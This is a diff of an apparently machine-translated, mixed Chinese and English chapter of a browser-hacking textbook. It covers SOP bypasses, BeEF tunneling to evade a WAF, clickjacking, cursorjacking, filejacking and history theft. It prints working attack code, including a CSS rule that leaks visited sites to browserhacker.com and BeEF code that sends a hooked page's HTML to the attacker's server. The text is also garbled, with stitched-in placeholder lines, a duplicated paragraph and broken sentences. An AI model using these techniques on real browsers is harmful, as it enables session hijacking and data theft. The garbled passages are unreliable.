-考虑一种情况：目标浏览器在 Opera 中有两个打开的标签页：一个是你控制的钩选标签页，另一个是目标的已认证源。如果你在钩选标签页中创建一个以已认证源为 src 的 IFrame，你就可以读取 IFrame 的内容。这意味着你可以访问目标已认证源中的任何敏感信息。
+考虑一种情况：目标浏览器在 Opera 中有两个打开的标签页：一个是你控制的钩选标签页，另一个是目标的已认证源。如果你在钩选标签页中创建一个以已认证源为 `src` 的 IFrame，你就可以读取 IFrame 的内容。这意味着你可以访问目标已认证源中的任何敏感信息。
 
 这种攻击的结果是读取跨源资源的内容，从而有效绕过 SOP。
 
-## 绕过 SOP 在云存储中的应用
+# 绕过 SOP 在云存储中的应用
 
 SOP 强制执行的问题不仅仅局限于浏览器和插件。2012 年，多个云存储服务也被发现存在 SOP 绕过弱点，包括 iOS 上的 Dropbox 1.4.6 和 2.0.1，Android 上的 Dropbox 2.0.1，以及 iOS 上的 Google Drive 1.0.1。这些服务允许本地文件存储和同步到云端，以便在其他安装了 Dropbox 或 Google Drive 客户端的设备上随时访问。
 
@@ -3381,10 +3298,10 @@ Roi Saltzman 发现了一个类似于前文提到的 Safari SOP 绕过的漏洞�
 file:///var/mobile/Applications/APP_UUID
 ```
 
-如果你能骗人通过客户端加载一个 HTML 文件，其中包含的 JavaScript 代码将被执行。由于文件加载在特权区域，JavaScript 可以访问移动设备的本地文件系统。需要注意的是，强制执行 SOP 的设计本身就有缺陷。因为恶意 HTML 文件是通过 file 方案加载的，JavaScript 可以访问其他文件，例如：
+如果你能骗人通过客户端加载一个 HTML 文件，其中包含的 JavaScript 代码将被执行。由于文件加载在特权区域，JavaScript 可以访问移动设备的本地文件系统。需要注意的是，强制执行 SOP 的设计本身就有缺陷。因为恶意 HTML 文件是通过 `file` 方案加载的，JavaScript 可以访问其他文件，例如：
 
 ```
-file:///var/mobile/Library/AddressBook/AddressBook.sqlitedb 
+file:///var/mobile/Library/AddressBook/AddressBook.sqlitedb
 ```
 
 这份 SQLite 数据库包含 iOS 用户的通讯录。当然，该文件必须是应用程序可以访问的。如果目标应用程序拒绝在其范围之外访问文件，你仍然可以检索缓存文件等。这种漏洞导致的访问很大程度上取决于受影响的应用程序。
@@ -3414,11 +3331,11 @@ file:///var/mobile/Library/AddressBook/AddressBook.sqlitedb
 </html>
 ```
 
-这段攻击演示了通过精心放置的 JavaScript 在不同环境和上下文中运行的多种利用方法。JavaScript 不仅在网页浏览器中运行，还可能在其他环境中运行。在 iOS 攻击的例子中，该 exploit 在 Dropbox 或 Google 应用中的 UIWebView 对象内运行。UIWebView 对象通常作为嵌入式浏览器窗口在原生 iOS 应用中使用。
+这段攻击演示了通过精心放置的 JavaScript 在不同环境和上下文中运行的多种利用方法。JavaScript 不仅在网页浏览器中运行，还可能在其他环境中运行。在 iOS 攻击的例子中，该 exploit 在 Dropbox 或 Google 应用中的 `UIWebView` 对象内运行。`UIWebView` 对象通常作为嵌入式浏览器窗口在原生 iOS 应用中使用。
 
 另一个值得注意的点是，该攻击针对移动操作系统，而非传统桌面环境。由于可见 UI 的大小限制，这类任务往往在目标甚至没有意识到的情况下进行。
 
-## 绕过 SOP 在 CORS 中
+# 绕过 SOP 在 CORS 中
 
 虽然跨来源资源共享（CORS）是放宽 SOP 的好方法，但如果不充分理解放宽策略的安全影响，很容易配置错误。以下是一个潜在的误配置示例：
 
@@ -3428,14 +3345,11 @@ Access-Control-Allow-Origin: *
 
 2012 年 11 月，Veracode 进行研究，分析了 Alexa 前一百万个网站的 HTTP 头部。24 个唯一的来源返回了 `Access-Control-Allow-Origin` 头的通配符值。这实际上允许 Internet 上的任何其他网站向这些网站提交跨源请求并读取响应。实践中，这意味着攻击者拥有等同于 SOP 绕过的所有这些域的功能。根据 Web 应用功能的不同，这种配置的结果可能是灾难性的。从一个不同来源的钩选浏览器中，这些来源可以以比 SOP 强制的情况更可靠的方式被爬取和攻击。
 
-
-
-
-显然，在 Access-Control-Allow-Origin 设置为通配符值时可能并不存在安全隐患。例如，如果仅使用宽松策略来提供不包含敏感信息的内容。
+显然，在 `Access-Control-Allow-Origin` 设置为通配符值时可能并不存在安全隐患。例如，如果仅使用宽松策略来提供不包含敏感信息的内容。
 
 在分析设置 CORS 头部的应用程序时，始终要理解允许的源之间的关系。即使未使用通配符值，也可能会有多个源被允许连接到同一目标。因此，针对这些允许的源的标准 XSS 漏洞可能足以让你跨源利用目标功能。
 
-所有这些 SOP 绕过示例仅作为概念性说明——它们并非穷尽列表。其他向量可能在此处描述，而且许多其他的仍在等待公开。我们鼓励您思考不同种类之间的关系，以及它们共同依赖的共同点。依赖 301 或 302 重定向以及 file 等方案的 SOP 绕过在未来发现的新 SOP 执行漏洞中几乎肯定会非常常见。
+所有这些 SOP 绕过示例仅作为概念性说明——它们并非穷尽列表。其他向量可能在此处描述，而且许多其他的仍在等待公开。我们鼓励您思考不同种类之间的关系，以及它们共同依赖的共同点。依赖 301 或 302 重定向以及 `file` 等方案的 SOP 绕过在未来发现的新 SOP 执行漏洞中几乎肯定会非常常见。
 
 # Exploiting SOP Bypasses
 
@@ -3451,19 +3365,16 @@ Anton Rager 发布了首篇公开的研究论文，阐述如何利用 XSS 漏洞
 
 其他利用挂钩浏览器作为 HTTP 代理的研究还包括 Ferruh Mavituna 于 2007 年发布的 XSS Tunnel27。该概念随后被纳入 BeEF，演变为 Tunneling Proxy。此后，BeEF 的 Tunneling Proxy 进一步扩展，以支持利用其他 SOP 绕过方法。代理请求的核心思路如下：
 
-Level1 **1.** 服务器套接字在攻击机器（代理后端）上监听。它解析传入的 HTTP 请求，并将其转换为 AJAX 请求，准备作为额外的 JavaScript 代码注入到挂钩浏览器中。**2.** 这些 JavaScript 片段随后通过第 3 章中探讨的通信通道之一发送到挂钩浏览器。**3.** 当挂钩浏览器执行这些额外代码时，相应的 AJAX 请求会被发出，HTTP 响应随即返回到代理后端。**4.** 代理后端会剥除并调整各种头部（如 Gzip、Content‑Length 等），然后将响应发送回最初向代理发送 HTTP 请求的客户端套接字。
-
-/Level1
+1. 服务器套接字在攻击机器（代理后端）上监听。它解析传入的 HTTP 请求，并将其转换为 AJAX 请求，准备作为额外的 JavaScript 代码注入到挂钩浏览器中。
+2. 这些 JavaScript 片段随后通过第 3 章中探讨的通信通道之一发送到挂钩浏览器。
+3. 当挂钩浏览器执行这些额外代码时，相应的 AJAX 请求会被发出，HTTP 响应随即返回到代理后端。
+4. 代理后端会剥除并调整各种头部（如 Gzip、`Content-Length` 等），然后将响应发送回最初向代理发送 HTTP 请求的客户端套接字。
 
 这些步骤已在 Figure 4-7 中复现，图中展示了如何通过挂钩浏览器隧道传输请求。
-
- start figure 
 
 **Figure 4-7:** Tunneling Proxy 高层架构
 
 ![c04f007.eps](img/c04f007.png)
-
- end figure 
 
 在隧道传输请求时，默认情况下您仅限于与挂钩站点同源的请求，因为 SOP 防止跨源访问。例如，若挂钩了 browservictim.com 的用户，您只能请求该源内的页面。这是因为 SOP 阻止您跨越该源。
 
@@ -3471,9 +3382,9 @@ Level1 **1.** 服务器套接字在攻击机器（代理后端）上监听。它
 
 考虑一种场景（无 SOP 绕过）：您想攻击一个面向公众的 Web 应用。可能存在 Web Application Firewall（WAF），配置为在五次恶意请求后严格阻止攻击源 IP。您刚刚发现一种 DOM‑based XSS，这种漏洞无法通过传统 WAF 进行防御，并且您已成功挂钩到公司内部网络中的一位用户。WAF 通常会在规则集中白名单公司网关地址和网段，因为内部网络被视为攻击概率极低的来源。
 
-您现在可以利用 Tunneling Proxy 检查该 Web 应用的更多漏洞。请求通过挂钩浏览器（位于内部网络）进行隧道传输，因而不会在 WAF 上产生过多噪声，理想情况下会被完全忽略，因为请求来源被视为可信的内部网络。正如第 9 章“通过浏览器代理”所探讨的，您甚至可以通过 Tunneling Proxy 使用 Burp 和 sqlmap。
+您现在可以利用 Tunneling Proxy 检查该 Web 应用的更多漏洞。请求通过挂钩浏览器（位于内部网络）进行隧道传输，因而不会在 WAF 上产生过多噪声，理想情况下会被完全忽略，因为请求来源被视为可信的内部网络。正如第 9 章“通过浏览器代理”所探讨的，您甚至可以通过 Tunneling Proxy 使用 `Burp` 和 `sqlmap`。
 
-另一种使用 Tunneling Proxy 的原因是当目标源需要身份验证时。想象您已通过 XSS 在身份验证后获取了挂钩浏览器，您可以利用 Tunneling Proxy 轻松浏览已验证的应用界面，实际上借助挂钩目标的会话进行访问。您无需窃取 Cookie。值得注意的是，HttpOnly 安全控制在此情形下无效，因为是目标浏览器本身在为您请求资源。
+另一种使用 Tunneling Proxy 的原因是当目标源需要身份验证时。想象您已通过 XSS 在身份验证后获取了挂钩浏览器，您可以利用 Tunneling Proxy 轻松浏览已验证的应用界面，实际上借助挂钩目标的会话进行访问。您无需窃取 Cookie。值得注意的是，`HttpOnly` 安全控制在此情形下无效，因为是目标浏览器本身在为您请求资源。
 
 如果将 Tunneling Proxy 与 SOP 绕过相结合，您便拥有了开放的 HTTP 代理。这是因为受影响的挂钩浏览器能够发送跨源请求并读取所有源的响应。事实上，如果您有多个受相同 SOP 绕过影响的挂钩浏览器，则可以获得多个代理。您可以根据各挂钩浏览器的网络带宽进行切换，或利用多个挂钩浏览器同时发起同源请求，从多个位置交付攻击。
 
@@ -3487,25 +3398,39 @@ UI 重置攻击在浏览器和应用安全场景中日益突出。随着社交�
 
 Clickjacking 攻击利用独立定位的透明 IFrames 与特殊 CSS 选择器欺骗用户点击不可见的元素。该攻击最早在 2002 年由 Jesse Ruderman 讨论，随后于 2008 年由 Robert Hansen 和 Jeremiah Grossman 命名为 Clickjacking。下面是一个示例，其中包含行政功能的页面通过 IFrame 嵌入到另一页面：
 
-
-
-
+```
 <html>
-<head>
-</head>
-<body>
-  <form name="addUserToAdmins" action="javascript:alert('clicked on hidden IFrame. User added.')" method="POST">
-    <input type="hidden" name="userId" value"1234">
-    <input type="hidden" name="isAdmin" value"true">
-    <input type="hidden" name="token" value"asasdasd86a
-sd876as87623234aksjdhjkashd">
-    <input type="submit" value="Add to admin group" 
-    style="height: 60px; width: 150px; font-size:3em">
-  </form>
-</body>
-</html>
 
-The page also uses anti-XSRF tokens to prevent Cross-site Request Forgery attacks. For the sake of the demonstration, the action attribute of the HTML form contains JavaScript that displays an Alert box. A real page would contain a proper URL where those input values are sent. When the user clicks the Submit button, the user with ID 1234 is added to the administrative group. To launch the attack, the previous page is framed in the following page:
+<head>
+
+</head>
+
+<body>
+
+  <form name="addUserToAdmins" action="javascript:alert('clicked on hidden IFrame. User added.')" method="POST">
+
+    <input type="hidden" name="userId" value"1234">
+
+    <input type="hidden" name="isAdmin" value"true">
+
+    <input type="hidden" name="token" value"asasdasd86a
+
+sd876as87623234aksjdhjkashd">
+
+    <input type="submit" value="Add to admin group" 
+
+    style="height: 60px; width: 150px; font-size:3em">
+
+  </form>
+
+</body>
+
+</html>
+```
+
+The page also uses anti-XSRF tokens to prevent Cross-site Request Forgery attacks. For the sake of the demonstration, the `action` attribute of the HTML form contains JavaScript that displays an Alert box. A real page would contain a proper URL where those input values are sent. When the user clicks the Submit button, the user with ID 1234 is added to the administrative group. To launch the attack, the previous page is framed in the following page:
+
+
 
 ```html
 <html>
@@ -3572,13 +3497,13 @@ This is a very simple example of how a user can be fooled into performing unwant
 
 The fact the application relies on an anti-XSRF token doesn’t impact the delivery of the Clickjacking attack. This is because the resource to be framed is loaded normally and contains a valid anti-XSRF token. Clickjacking is in fact an ideal attack method you can perform against an application that uses anti-XSRF tokens, effectively nullifying the protection offered by those tokens.
 
-Chapter 3 discusses how to prevent loading resources in IFrames. The same caveats presented in that chapter can be applied here. A way to generally prevent UI redressing attacks (as almost every attack relies on loading a resource into an IFrame) is by using the header X-Frame-Options: DENY. As you will learn in the next sections, there have been cases where simple frame-busting code was not enough to prevent some attacks.
+Chapter 3 discusses how to prevent loading resources in IFrames. The same caveats presented in that chapter can be applied here. A way to generally prevent UI redressing attacks (as almost every attack relies on loading a resource into an IFrame) is by using the header `X-Frame-Options: DENY`. As you will learn in the next sections, there have been cases where simple frame-busting code was not enough to prevent some attacks.
 
 start feature 
 
 * * *
 
-**Clickjacking the Flash Settings Manager** Robert Hansen and Jeremiah Grossman contributed greatly to the public awareness of Clickjacking attacks. In 2008, they were able to mount a Clickjacking attack on the Flash Settings Manager.30 Using transparent (opaque=0) IFrames and divs, they successfully hid the Flash Settings Manager “Allow” button over those elements. The target, while apparently clicking an innocuous button, would actually be clicking on the Flash Settings widget as shown in Figure 4-11.  start figure  
+**Clickjacking the Flash Settings Manager** Robert Hansen and Jeremiah Grossman contributed greatly to the public awareness of Clickjacking attacks. In 2008, they were able to mount a Clickjacking attack on the Flash Settings Manager.30 Using transparent (`opaque=0`) IFrames and divs, they successfully hid the Flash Settings Manager “Allow” button over those elements. The target, while apparently clicking an innocuous button, would actually be clicking on the Flash Settings widget as shown in Figure 4-11. start figure  
 
 **Figure 4-11:** The opaque IFrames and divs cover the Flash widget text.
 
@@ -3592,9 +3517,9 @@ The previous Clickjacking examples have demonstrated what is possible with CSS a
 
 Imagine you framed a page with a button that required a user click in order to execute your attack. In this instance, your Clickjacking aim is to ensure your target’s mouse is always on top of that button. In this way, as soon as they click anywhere, the user is effectively clicking exactly where you want. Rich Lundeen and Brendan Coles created a BeEF command module implementing this very technique.31
 
-In this scenario you have two frames, an inner and an outer IFrame. The outer I think the target origin you want to exploit with the Clickjacking attack. The inner IFrame instead listens to onmousemove events, and its position gets updated according to the current mouse cursor position. In this way, the mouse cursor is always over what you want the target to click on.
+In this scenario you have two frames, an inner and an outer IFrame. The outer I think the target origin you want to exploit with the Clickjacking attack. The inner IFrame instead listens to `onmousemove` events, and its position gets updated according to the current mouse cursor position. In this way, the mouse cursor is always over what you want the target to click on.
 
-The following code uses the jQuery API to dynamically update the position of outerObj given the current mouse coordinates:
+The following code uses the jQuery API to dynamically update the position of `outerObj` given the current mouse coordinates:
 
 ```
 $j("body").mousemove(function(e) {
@@ -3610,7 +3535,7 @@ filter:alpha(opacity=0);
 opacity:0;
 ```
 
-Consider the following sample page, which is the target of the Clickjacking attack. You want the user to click the Add User button, which in this case simply creates a pop-up when the user clicks it. Note the bodybackground that has been added to better illustrate the following example:
+Consider the following sample page, which is the target of the Clickjacking attack. You want the user to click the Add User button, which in this case simply creates a pop-up when the user clicks it. Note the `body`background that has been added to better illustrate the following example:
 
 ```
 <html>
@@ -3640,8 +3565,6 @@ end figure   start figure
 ![c04f013.tif](img/c04f013.png)
 
 end figure 
-
-
 
 当用户决定点击某个位置时，点击会触发框架页面中按钮的 `onClick` 事件。正如你在框架页面的源代码中所看到的，这会弹出一个提示框对话框，如图 4-14 所示。
 
@@ -3713,13 +3636,15 @@ end figure
 
 为了演示的需要，背景图像是可见的。在真实攻击中，图像仍是 PNG 格式，但背景透明。当目标点击“第二”或“第四”按钮时，实际上是点击页面左侧的按钮。真实的鼠标位置通过新光标图像隐藏。
 
-Krzysztof Kotowicz34 和 Mario Heiderich 扩展了这些光标劫持技术。他们的新攻击向量完全隐藏了光标，并在 body 元素上添加了以下样式：
+Krzysztof Kotowicz34 和 Mario Heiderich 扩展了这些光标劫持技术。他们的新攻击向量完全隐藏了光标，并在 `body` 元素上添加了以下样式：
 
 ```
 <body style="cursor:none">
 ```
 
-随后会动态加载一个新的光标图像，并将其与 mousemove 事件关联。下面的代码演示了这种技术：
+
+
+随后会动态加载一个新的光标图像，并将其与 `mousemove` 事件关联。下面的代码演示了这种技术：
 
 ```
 <html>
@@ -3774,7 +3699,7 @@ shake(5);
 </body>
 ```
 
-首先，将鼠标光标图像替换为自定义图像。其次，在页面 body 上附加一个新的事件监听器，监听 mousemove 事件。当真实鼠标移动时，事件触发监听器，使伪光标（可见的那个）相应移动。
+首先，将鼠标光标图像替换为自定义图像。其次，在页面 `body` 上附加一个新的事件监听器，监听 `mousemove` 事件。当真实鼠标移动时，事件触发监听器，使伪光标（可见的那个）相应移动。
 
 通过 JavaScript，实时跟踪真实鼠标在 x 和 y 方向的移动，并更新伪光标的位置。正如你可能注意到的，前一节关于高级点击劫持中使用的技术相同。结果如图 4-16 所示，当目标点击 YES 按钮时，实际上是在点击 Twitter 按钮。
 
@@ -3790,7 +3715,7 @@ end figure
 
 ### 使用文件劫持
 
-文件劫持允许通过浏览器内的巧妙 UI  manipulation 将目标机器的目录内容泄露到攻击者的服务器。结果是，在特定条件下，你可以从目标机器下载文件。成功执行此攻击的两个前提是：
+文件劫持允许通过浏览器内的巧妙 UI manipulation 将目标机器的目录内容泄露到攻击者的服务器。结果是，在特定条件下，你可以从目标机器下载文件。成功执行此攻击的两个前提是：
 
 Level1 **1.** 目标必须使用 Chrome，因为目前只有 Chrome 支持类似下面的 `webkitdirectory` 和 `directory` 输入属性：
 
@@ -3803,9 +3728,6 @@ Level1 **1.** 目标必须使用 Chrome，因为目前只有 Chrome 支持类似
 /Level1
 
 Kotowicz36 首先在 2011 年发表了这项 UI 重定位研究，之后分析了将文件劫持攻击推广给用户的社交工程手段的影响。
-
-
-
 
 The Filejacking attack relies on the target using the operating system’s “Choose Folder” dialog box when downloading a file from the web. To optimize the attack, you should attempt to trick the user into selecting a directory containing sensitive files, for instance by employing authentic-looking phishing content. Figure 4-17 demonstrates what the target will see if they select the “Download to…” button. JavaScript will enumerate the files in the directory with the directory input attribute, and then POST each of the files back to your server.
 
@@ -3909,9 +3831,6 @@ src="http://browservictim.com/any"></iframe>
 
  start figure 
 
-
-
-
 -   图 4-20： 缩放 IFrame 可以显示更多细节
 
 ![c04f020.eps](img/c04f020.png)
@@ -3927,6 +3846,8 @@ start figure
 ![c04f021.tif](img/c04f021.png)
 
 end figure 
+
+
 
 此技术可以实现跨源内容提取，从而有效绕过同源策略（SOP）。值得注意的是，2011 年 10 月，该技术在野外被用于攻击 Facebook。39
 
@@ -3948,7 +3869,7 @@ De Fulgentis 的技术再次明确表明，拖放操作缺乏同源策略（SOP�
 
 #### 使用 CSS 颜色
 
-在‘过去的美好时代’，可以通过 CSS 信息窃取浏览器历史记录。这主要是通过滥用 :visited CSS 选择器实现的。下面的技术（在 Full Disclosure41 中于 2002 年讨论）虽然简单，却非常有效。考虑以下链接：
+在‘过去的美好时代’，可以通过 CSS 信息窃取浏览器历史记录。这主要是通过滥用 `:visited` CSS 选择器实现的。下面的技术（在 Full Disclosure41 中于 2002 年讨论）虽然简单，却非常有效。考虑以下链接：
 
 ```
 <a id="site_1" href="http://browservictim.com">link</a>
@@ -3962,7 +3883,7 @@ background: url(/browserhacker.com?site=browservictim);
 }
 ```
 
-在此例中，背景选择器用于检查，但你可以使用任何可以指定 URI 的选择器。如果 browservictim.com 正好在浏览器历史记录中，那么会向 browserhacker.com?site=browservictim 发出一次 GET 请求。
+在此例中，背景选择器用于检查，但你可以使用任何可以指定 URI 的选择器。如果 `browservictim.com` 正好在浏览器历史记录中，那么会向 `browserhacker.com?site=browservictim` 发出一次 GET 请求。
 
 Jeremiah Grossman 在 2006 年披露了类似技术，该技术依赖于检查链接元素的颜色。在大多数浏览器中，未访问过的链接默认显示为蓝色，已访问过的链接则显示为紫色。Grossman 的原始概念证明（PoC）42 中，将已访问过的链接样式覆盖为自定义样式（例如红色）。随后使用脚本动态生成页面上的链接（可能隐藏在用户视野之外），并与之前覆盖的红色样式进行比较。如果颜色匹配，则说明该站点已在浏览器历史记录中。下面是一个示例：
 
@@ -3986,7 +3907,7 @@ console.log(color);
 </html>
 ```
 
-如果链接之前已被访问，且浏览器对该攻击保持脆弱，控制台输出会是 rgb(255, 0, 0)，对应 CSS 中覆盖的红色。若在最新的 Firefox（已修复该漏洞）中运行该片段，结果始终为 rgb(0, 0, 238)。
+如果链接之前已被访问，且浏览器对该攻击保持脆弱，控制台输出会是 `rgb(255, 0, 0)`，对应 CSS 中覆盖的红色。若在最新的 Firefox（已修复该漏洞）中运行该片段，结果始终为 `rgb(0, 0, 238)`。
 
 如今，大多数现代浏览器已经修补此行为。例如，Firefox 在 2010 年进行了修补。43
 
@@ -3998,7 +3919,7 @@ Michal Zalewski45 则提出了一种非破坏性的浏览器历史记录提取�
 
 Zalewski 的方法是通过在 IFrames 中加载资源、捕获同源策略（SOP）违规并阻止缓存修改来实现。IFrames 之所以适合此目的，是因为 SOP 强制执行，且可以阻止 IFrame 完全加载资源，从而避免本地缓存被修改。通过使用短时的加载和卸载操作，缓存保持不变。一旦确认某资源出现缓存不命中，则停止 IFrame 的加载。这样可以在稍后再次测试同一资源。
 
-此技术最有效的目标资源是 CSS 或 JavaScript 文件，因为它们常被浏览器缓存，并且在访问目标网站时总是会被加载。需要注意的问题是，这些资源会在 IFrame 中加载，因此不应包含任何防止嵌入的逻辑（如 X-Frame-Options，除了 Allow 之外）。
+此技术最有效的目标资源是 CSS 或 JavaScript 文件，因为它们常被浏览器缓存，并且在访问目标网站时总是会被加载。需要注意的问题是，这些资源会在 IFrame 中加载，因此不应包含任何防止嵌入的逻辑（如 `X-Frame-Options`，除了 Allow 之外）。
 
 下图 Figure 4-22 展示了该攻击的输出结果。在此例中，判断出用户访问了 [AboveTopSecret.com](http://AboveTopSecret.com) 和 [Wikileaks.org](http://Wikileaks.org)。
 
@@ -4019,55 +3940,75 @@ http://www.abovetopsecret.com/forum/ats-scripts.js
 
 该技术的核心代码片段如下：
 
-
-
-
+```
 function wait_for_noread() {
+
   try {
+
     /*
+
      * 这是 SOP 违规发生的位置，因为我们正在读取加载到 IFrame 中的跨域资源的 `location.href` 属性。
+
      */
+
     if (frames['f'].location.href == undefined) throw 1;
-  
+
     /*
+
      * 在 TIME_LIMIT 未到达之前，持续尝试读取 IFrame 中的 `location.href`。否则调用 `maybe_test_next()`，它会将 IFrame 的 src 重置为 about:blank，防止完整资源加载和缓存修改。
+
      * 然后继续处理下一个资源。
+
      */
+
     if (cycles++ >= TIME_LIMIT) {
+
       maybe_test_next();
+
       return;
+
     }
+
     setTimeout(wait_for_noread, 1);
+
   } catch (e) {
+
     /*
+
      * 捕获到 SOP 违规，确认被检查的资源已缓存。
+
      */
+
     confirmed_visited = true;
+
     maybe_test_next();
+
   }
+
 }
+```
 
 当 SOP 违规在特定超时之前被捕获，意味着缓存命中。这说明资源已缓存，从而可以推断用户已经访问过加载该资源的网站。Figure 4-23 演示了这种行为。
 
- start figure 
+start figure 
 
 **Figure 4-23:** SOP 违规错误
 
 ![c04f023.tif](img/c04f023.png)
 
- end figure 
+end figure 
 
 你可以在 [`browserhacker.com`](https://browserhacker.com) 网站或维基网站 [www.wiley.com/go/browserhackershandbook](http://www.wiley.com/go/browserhackershandbook) 查看该技术的完整源码，原始的三个 PoC 已被修改并合并为一个代码片段。
 
 当 SOP 违规在特定超时之前被捕获，意味着缓存命中。这说明资源已缓存，从而可以推断用户已经访问过加载该资源的网站。Figure 4-23 演示了这种行为。
 
- start figure 
+start figure 
 
 **Figure 4-24:** 调用专有的 `AFRunCommand` 函数
 
 ![c04f024.tif](img/c04f024.png)
 
- end figure 
+end figure 
 
 类似的漏洞也被发现于 Maxthon 3.4.5 build 2000。Maxthon 是另一款浏览器，和 Avant 类似，它会向 web 页面暴露非标准 API 以访问文件并甚至启动可执行文件。
 
@@ -4102,18 +4043,15 @@ result="";for(i=0;i<links.length;i++){if(links[i].target=="_blank"
 
 需要注意的是，这种跨内容脚本（Cross-content Scripting）漏洞在后续第 7 章中进一步探讨，并且是持久化的。第一次加载恶意内容到历史记录页面后，代码会在用户每次查看历史记录时执行。当用户打开浏览器历史记录页面时，结果类似于 Figure 4-25。
 
- start figure 
+start figure 
 
 **Figure 4-25:** 注入的恶意代码作为链接被执行。
 
 ![c04f025.tif](img/c04f025.png)
 
- end figure 
+end figure 
 
 要发动真正的攻击，需要将 `alert()` 函数替换为第 3 章讨论的钩子技术之一，这样就可以将窃取的浏览器历史发送回收集服务器。
-
-
-
 
 进入`/path/to/xxx`目录，找到`xxx.json`。
 
@@ -4126,8 +4064,6 @@ result="";for(i=0;i<links.length;i++){if(links[i].target=="_blank"
 ```
 if (condVar > someVal) {console.log("xxx")}
 ```
-
-
 
 18. Michael Coates. (2012). Firefox 16 的安全漏洞。检索于 2013 年 5 月 11 日 [`blog.mozilla.org/security/2012/10/10/security-vulnerability-in-firefox-16/`](https://blog.mozilla.org/security/2012/10/10/security-vulnerability-in-firefox-16/)
 
@@ -4154,6 +4090,8 @@ if (condVar > someVal) {console.log("xxx")}
 29. Jesse Ruderman. (2002). 如果 rame 内容默认背景为透明。检索于 2013 年 5 月 11 日 from [`bugzilla.mozilla.org/show_bug.cgi?id=154957`](https://bugzilla.mozilla.org/show_bug.cgi?id=154957)
 
 30. Robert Hansen and Jeremiah Grossman. (2008). 点击劫持。检索于 2013 年 5 月 11 日 from [`www.sectheory.com/clickjacking.htm`](http://www.sectheory.com/clickjacking.htm)
+
+
 
 31. Rich Lundeen. (2012). BeEF 点击劫持模块及使用 REST API 自动化攻击。检索于 2013 年 5 月 11 日 from [`webstersprodigy.net/2012/12/06/beef-clickjacking-module-and-using-the-rest-api-to-automate-attacks/`](http://webstersprodigy.net/2012/12/06/beef-clickjacking-module-and-using-the-rest-api-to-automate-attacks/)
 
@@ -4199,51 +4137,53 @@ if (condVar > someVal) {console.log("xxx")}
 
 # 伪造内容
 
+- [一种最简单且常被忽视的欺骗用户执行不当操作的方法，就是直接修改当前挂钩页面的内容。如果你能在某个源中执行 JavaScript，那么没有任何阻碍能阻止你获取当前文档的部分内容，或插入任意内容。这可以导致非常隐蔽且有效的方式，让用户在你的名义下执行操作。](https://example.org)
 
+1. 这些通过修改 DOM 离散片段的技术是大多数后续攻击的核心。事实上，许多这些方法在早期关于启动和保持浏览器控制的章节中已经讨论过。
 
+2. 那么从哪里开始？首先要知道要修改什么，你需要先知道当前文档里到底有什么。只要你的挂钩在文档的上下文中，这可以简单地通过获取 `document.body` 元素的值来实现。只要当前文档包含 `<body>` 标签，这将是该标签内的所有内容。
 
--   [一种最简单且常被忽视的欺骗用户执行不当操作的方法，就是直接修改当前挂钩页面的内容。如果你能在某个源中执行 JavaScript，那么没有任何阻碍能阻止你获取当前文档的部分内容，或插入任意内容。这可以导致非常隐蔽且有效的方式，让用户在你的名义下执行操作。](https://example.org)
-
-1.  这些通过修改 DOM 离散片段的技术是大多数后续攻击的核心。事实上，许多这些方法在早期关于启动和保持浏览器控制的章节中已经讨论过。
-
-2.  那么从哪里开始？首先要知道要修改什么，你需要先知道当前文档里到底有什么。只要你的挂钩在文档的上下文中，这可以简单地通过获取 `document.body` 元素的值来实现。只要当前文档包含 `<body>` 标签，这将是该标签内的所有内容。
-
-3.  任何 HTML 元素的 `innerHTML` 属性都可以被查询，以获取其自身及所有子元素的语法。BeEF 的“获取页面 HTML”模块正是这样做的：
+3. 任何 HTML 元素的 `innerHTML` 属性都可以被查询，以获取其自身及所有子元素的语法。BeEF 的“获取页面 HTML”模块正是这样做的：
 
 ```
-  try {
-    var html_head = document.head.innerHTML.toString();
-  } catch (e) {
-    var html_head = "Error: document has no head";
-  }
-  try {
-    var html_body = document.body.innerHTML.toString();
-  } catch (e) {
-    var html_body = "Error: document has no body";
-  }
+try {
+  var html_head = document.head.innerHTML.toString();
+} catch (e) {
+  var html_head = "Error: document has no head";
+}
+try {
+  var html_body = document.body.innerHTML.toString();
+} catch (e) {
+  var html_body = "Error: document has no body";
+}
 
-  beef.net.send("<%= @command_url %>", <%= @command_id %>,
-    'head='+html_head+'&body='+html_body);
+beef.net.send("<%= @command_url %>", <%= @command_id %>,
+  'head='+html_head+'&body='+html_body);
 ```
 
-4.  `html_head` 与 `html_body` 变量中填充的是文档的标题和正文的 HTML 内容。`toString()` 方法用于明确将它们转换为字符串，最后调用 `beef.net.send()` 方法将结果提交回 BeEF 服务器。
+4. `html_head` 与 `html_body` 变量中填充的是文档的标题和正文的 HTML 内容。`toString()` 方法用于明确将它们转换为字符串，最后调用 `beef.net.send()` 方法将结果提交回 BeEF 服务器。
 
-5.  开始特性
+5. 开始特性
 
-6.  * * *
+6. * * *
 
-7.  **BeEF 的 net.send 如何工作** 保持控制在第三章中已经被大量讨论，但在 BeEF 内部隐藏着大量有趣的代码，这些代码简化了命令模块向框架发送数据的方式。`beef.net.send()` 方法是一个完美的例子。为了提供命令模块可靠地向 BeEF 服务器提交数据的可靠方法，`beef.net.send()` 方法及其服务器端数据处理器被构建。你会在之前的 `beef.net.send()` 调用中注意到它包含三个参数——`@command_url`、`@command_id`，以及一个字符串值——例如 `‘head=’+html_head+’&body=’+html_body`。在 BeEF 在将命令模块提交到受害者浏览器之前，会在提交前将 `@command_url` 与 `@command_id` 字段替换为指向当前命令 URL 与其唯一 ID 的引用。当 `beef.net.send()` 将这些值提交回时，BeEF 服务器能够汇总哪个唯一的命令模块该响应所属。这使得攻击者可以并发提交多个命令模块，并保持响应与请求的同步。代码执行的步骤如下：
+7. **BeEF 的 net.send 如何工作** 保持控制在第三章中已经被大量讨论，但在 BeEF 内部隐藏着大量有趣的代码，这些代码简化了命令模块向框架发送数据的方式。`beef.net.send()` 方法是一个完美的例子。为了提供命令模块可靠地向 BeEF 服务器提交数据的可靠方法，`beef.net.send()` 方法及其服务器端数据处理器被构建。你会在之前的 `beef.net.send()` 调用中注意到它包含三个参数——`@command_url`、`@command_id`，以及一个字符串值——例如 `‘head=’+html_head+’&body=’+html_body`。在 BeEF 在将命令模块提交到受害者浏览器之前，会在提交前将 `@command_url` 与 `@command_id` 字段替换为指向当前命令 URL 与其唯一 ID 的引用。当 `beef.net.send()` 将这些值提交回时，BeEF 服务器能够汇总哪个唯一的命令模块该响应所属。这使得攻击者可以并发提交多个命令模块，并保持响应与请求的同步。代码执行的步骤如下：
 
